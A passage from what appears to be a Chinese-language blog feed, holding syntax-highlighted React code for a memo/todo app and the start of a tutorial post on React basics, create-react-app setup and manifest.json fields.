class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token function">loadData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">{</span>    todos<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    filter<span class="token punctuation">:</span> <span class="token string">'全部'</span><span class="token punctuation">,</span>    order<span class="token punctuation">:</span> <span class="token string">'time'</span><span class="token punctuation">,</span>    reverse<span class="token punctuation">:</span> <span class="token boolean">false</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> filter <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>filter  <span class="token keyword">let</span> items <span class="token operator">=</span> <span class="token function">sortArrayByProps</span><span class="token punctuation">(</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>todos<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>memo <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> filter <span class="token operator">===</span> <span class="token string">'全部'</span>        <span class="token operator">?</span> <span class="token boolean">true</span>        <span class="token punctuation">:</span> filter <span class="token operator">===</span> <span class="token string">'已完成'</span>        <span class="token operator">?</span> memo<span class="token punctuation">.</span>done        <span class="token punctuation">:</span> <span class="token operator">!</span>memo<span class="token punctuation">.</span>done    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>order<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>reverse  <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"todo-app"</span><span class="token operator">></span>      <span class="token operator">&lt;</span>Header        onClickAdd<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleAdd<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        onChangeOrder<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleChangeOrder<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        onChangeFilter<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleChangeFilter<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span>      <span class="token operator">/</span><span class="token operator">></span>      <span class="token operator">&lt;</span>TodoList        title<span class="token operator">=</span><span class="token punctuation">{</span>filter<span class="token punctuation">}</span>        items<span class="token operator">=</span><span class="token punctuation">{</span>items<span class="token punctuation">}</span>        onToggleState<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleToggleState<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        onChangeColor<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleChangeColor<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        onDelete<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleDelete<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span>      <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">handleAdd</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> date<span class="token punctuation">,</span> time<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>    <span class="token punctuation">{</span>      todos<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>todos<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span>        <span class="token punctuation">{</span>          color<span class="token punctuation">:</span> <span class="token string">'#ffffff'</span><span class="token punctuation">,</span>          text<span class="token punctuation">,</span>          time<span class="token punctuation">:</span> date <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> time<span class="token punctuation">,</span>          done<span class="token punctuation">:</span> <span class="token boolean">false</span>        <span class="token punctuation">}</span>      <span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">saveData</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">handleToggleState</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span> <span class="token punctuation">{</span>  memo<span class="token punctuation">.</span>done <span class="token operator">=</span> <span class="token operator">!</span>memo<span class="token punctuation">.</span>done  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">saveData</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">handleChangeColor</span><span class="token punctuation">(</span>memo<span class="token punctuation">,</span> color<span class="token punctuation">)</span> <span class="token punctuation">{</span>  memo<span class="token punctuation">.</span>color <span class="token operator">=</span> color  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">saveData</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">handleDelete</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> todos <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>todos  todos<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>todos<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>todos<span class="token punctuation">:</span> todos<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">saveData</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">handleChangeOrder</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>reverse<span class="token punctuation">:</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>reverse<span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>order<span class="token punctuation">:</span> field<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">saveData</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">handleChangeFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>filter<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">saveData</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>Header<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Header</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span><span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>    value<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>    date<span class="token punctuation">:</span> <span class="token string">'2000-01-01'</span><span class="token punctuation">,</span>    time<span class="token punctuation">:</span> <span class="token string">'00:00'</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">handleAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">onClickAdd</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>value<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>date<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">handleTextChange</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    value<span class="token punctuation">:</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">handleDateChange</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    date<span class="token punctuation">:</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">handleTimeChange</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    time<span class="token punctuation">:</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"header"</span><span class="token operator">></span>      <span class="token operator">&lt;</span>h3 className<span class="token operator">=</span><span class="token string">"title"</span><span class="token operator">></span>备忘录<span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span>      <span class="token operator">&lt;</span>button        type<span class="token operator">=</span><span class="token string">"button"</span>        disabled<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>value<span class="token punctuation">}</span>        onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleAdd<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span>      <span class="token operator">></span>添加<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>      <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"input-wrapper"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input          value<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>value<span class="token punctuation">}</span>          type<span class="token operator">=</span><span class="token string">"text"</span>          name<span class="token operator">=</span><span class="token string">"text"</span>          onChange<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleTextChange<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input          type<span class="token operator">=</span><span class="token string">"date"</span>          className<span class="token operator">=</span><span class="token string">"date"</span>          name<span class="token operator">=</span><span class="token string">"date"</span>          value<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>date<span class="token punctuation">}</span>          onChange<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleDateChange<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input          type<span class="token operator">=</span><span class="token string">"time"</span>          className<span class="token operator">=</span><span class="token string">"time"</span>          name<span class="token operator">=</span><span class="token string">"time"</span>          value<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>time<span class="token punctuation">}</span>          onChange<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handleTimeChange<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token operator">/</span><span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>      <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"bar"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>strong<span class="token operator">></span>排序<span class="token operator">&lt;</span><span class="token operator">/</span>strong<span class="token operator">></span>        <span class="token operator">&lt;</span>span onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">onChangeOrder</span><span class="token punctuation">(</span><span class="token string">'color'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>颜色<span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span>        <span class="token operator">&lt;</span>span onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">onChangeOrder</span><span class="token punctuation">(</span><span class="token string">'time'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>时间<span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span>        <span class="token operator">&lt;</span>strong style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>marginLeft<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span>过滤<span class="token operator">&lt;</span><span class="token operator">/</span>strong<span class="token operator">></span>        <span class="token operator">&lt;</span>span onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">onChangeFilter</span><span class="token punctuation">(</span><span class="token string">'全部'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>全部<span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span>        <span class="token operator">&lt;</span>span onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">onChangeFilter</span><span class="token punctuation">(</span><span class="token string">'待做'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>待做<span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span>        <span class="token operator">&lt;</span>span onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">onChangeFilter</span><span class="token punctuation">(</span><span class="token string">'已完成'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>已完成<span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>TodoList<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> TodoList <span class="token operator">=</span> props <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token keyword">let</span> todoList <span class="token operator">=</span> props<span class="token punctuation">.</span>items<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span>memo<span class="token punctuation">,</span> index<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span>  <span class="token operator">&lt;</span>Memo    memo<span class="token operator">=</span><span class="token punctuation">{</span>memo<span class="token punctuation">}</span>    key<span class="token operator">=</span><span class="token punctuation">{</span>index<span class="token punctuation">}</span>    onToggleState<span class="token operator">=</span><span class="token punctuation">{</span>props<span class="token punctuation">.</span>onToggleState<span class="token punctuation">}</span>    onChangeColor<span class="token operator">=</span><span class="token punctuation">{</span>props<span class="token punctuation">.</span>onChangeColor<span class="token punctuation">}</span>    onDelete<span class="token operator">=</span><span class="token punctuation">{</span>props<span class="token punctuation">.</span>onDelete<span class="token punctuation">}</span>  <span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token punctuation">(</span>  <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"todo-list-wrapper"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span><span class="token punctuation">{</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>props<span class="token punctuation">.</span>title<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>props<span class="token punctuation">.</span>items<span class="token punctuation">.</span>length<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"todo-list"</span><span class="token operator">></span><span class="token punctuation">{</span>todoList<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li>Memo<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> Memo <span class="token operator">=</span> props <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token keyword">let</span> memo <span class="token operator">=</span> props<span class="token punctuation">.</span>memo<span class="token keyword">let</span> classNames <span class="token operator">=</span> <span class="token string">'todo-item'</span> <span class="token operator">+</span> <span class="token punctuation">(</span>memo<span class="token punctuation">.</span>done <span class="token operator">?</span> <span class="token string">' done'</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token punctuation">(</span>  <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token punctuation">{</span>classNames<span class="token punctuation">}</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input      type<span class="token operator">=</span><span class="token string">"checkbox"</span>      checked<span class="token operator">=</span><span class="token punctuation">{</span>memo<span class="token punctuation">.</span>done<span class="token punctuation">}</span>      onChange<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> props<span class="token punctuation">.</span><span class="token function">onToggleState</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token punctuation">}</span>    <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input      type<span class="token operator">=</span><span class="token string">"color"</span>      className<span class="token operator">=</span><span class="token string">"color"</span>      value<span class="token operator">=</span><span class="token punctuation">{</span>memo<span class="token punctuation">.</span>color<span class="token punctuation">}</span>      onChange<span class="token operator">=</span><span class="token punctuation">{</span>e <span class="token operator">=</span><span class="token operator">></span> props<span class="token punctuation">.</span><span class="token function">onChangeColor</span><span class="token punctuation">(</span>memo<span class="token punctuation">,</span> e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span>    <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>span className<span class="token operator">=</span><span class="token string">"text"</span><span class="token operator">></span><span class="token punctuation">{</span>memo<span class="token punctuation">.</span>text<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span>    <span class="token operator">&lt;</span>span className<span class="token operator">=</span><span class="token string">"pull-right del"</span> onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> props<span class="token punctuation">.</span><span class="token function">onDelete</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>      X    <span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span>    <span class="token operator">&lt;</span>a className<span class="token operator">=</span><span class="token string">"pull-right"</span> href<span class="token operator">=</span><span class="token string">"void javascript 0"</span><span class="token operator">></span>      <span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>memo<span class="token punctuation">.</span>time<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> react </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React学习（一）基础语法</title>
      <link href="/2018/12/18/react-xue-xi-yi-ji-chu-yu-fa/"/>
      <url>/2018/12/18/react-xue-xi-yi-ji-chu-yu-fa/</url>
      
        <content type="html"><![CDATA[<h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><ul><li>安装脚手架<pre class=" language-bash"><code class="language-bash">npx create-react-app <span class="token operator">&lt;</span>project-name<span class="token operator">></span></code></pre></li><li><p>目录<br><img src="/img/in-post/react-00.JPG" alt="react folder"></p></li><li><p><strong>manifest.json</strong></p><ul><li>允许将站点添加至主屏幕（<a href="https://caniuse.com/#search=manifest" target="_blank" rel="noopener">support</a>）</li><li><code>name: {string}</code> 应用名称，用于安装横幅、启动画面显示</li><li><code>short_name: {string}</code>应用短名称，用于主屏幕显示（显示在主屏幕的应用名称长度有限，超长部分会被截断并显示省略号，需要设置较短的应用名称优化显示）</li><li><code>icons: {Array.&lt;ImageObject&gt;}</code> 应用图标列表<ul><li><code>ImageObject</code>：<ul><li><code>src: {string}</code> 图标 url</li><li><code>type {string}</code> 图标的 mime 类型</li><li><code>sizes {string}</code> 图标尺寸，格式为widthxheight，宽高数值以 css 的 px 为单位</li></ul></li></ul></li><li><code>start_url: {string}</code> 应用启动地址</li><li><code>scope: {string}</code> 作用域，仅仅对站点的某些模块进行 PWA 改造</li><li><code>background_color: {Color} css色值</code>设置启动背景颜色</li><li><code>display: {string}</code> 设置启动显示类型<br><img src="/img/in-post/react-01.JPG" alt=""></li><li><code>orientation: string</code> 应用显示方向</li><li><code>theme_color: {Color} css色值</code>指定 PWA 的主题颜色,制浏览器 UI 的颜色。比如启动画面上状态栏、内容页中状态栏、地址栏的颜色，会被 theme_color 所影响</li></ul></li><li>运行<pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> <span class="token operator">&lt;</span>project-name<span class="token operator">></span>//运行yarn start//暴露配置webpack接口yarn ejet//打包yarn build//打包运行 yarn global add serveserve -s build</code></pre></li></ul><h4 id="组件的写法"><a href="#组件的写法" class="headerlink" title="组件的写法"></a>组件的写法</h4><ul><li>React元素<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> element <span class="token operator">=</span> <span class="token operator">&lt;</span>Welcome name<span class="token operator">=</span><span class="token string">"Sara"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">;</span></code></pre></li><li>函数定义<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//函数式组件是无状态组件，只能使用props</span><span class="token keyword">function</span> <span class="token function">Welcome</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token operator">&lt;</span>h1<span class="token operator">></span>Hello<span class="token punctuation">,</span> <span class="token punctuation">{</span>props<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//箭头函数</span><span class="token keyword">let</span> Welcome <span class="token operator">=</span> <span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token operator">&lt;</span>h1<span class="token operator">></span>Hello<span class="token punctuation">,</span> <span class="token punctuation">{</span>props<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>类定义组件<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Welcome</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token operator">&lt;</span>h1<span class="token operator">></span>Hello<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> Welcome <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">createClass</span><span class="token punctuation">(</span><span class="token punctuation">{</span>render<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token operator">&lt;</span>h1<span class="token operator">></span>Hello <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token 